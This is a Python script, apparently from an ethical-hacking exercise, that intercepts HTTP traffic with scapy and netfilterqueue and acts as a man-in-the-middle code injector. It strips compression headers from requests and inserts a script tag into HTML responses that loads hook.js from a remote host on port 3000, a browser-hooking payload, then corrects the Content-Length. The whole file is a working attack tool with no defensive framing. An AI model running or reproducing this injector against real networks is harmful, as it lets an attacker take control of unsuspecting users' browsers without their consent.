import scapy.all as scapy
import netfilterqueue
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("REQUEST")
                load = re.sub("Accept-Encoding:.*?\r\n", "", load, flags=re.IGNORECASE)

            elif scapy_packet[scapy.TCP].sport == 80:
                print("RESPONSE")
                injection_code = '<script src="http://192.168.190.136:3000/hook.js"></script>'
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(Content-Length:\s)(\d*)", load)
                if content_length_search and re.search("Content-Type:.*text/html", load, re.IGNORECASE):
                    original_length = int(content_length_search.group(2))
                    new_length = original_length + len(injection_code)
                    load = load.replace(content_length_search.group(0), f"Content-Length: {new_length}")

            if load.encode() != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load.encode())
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
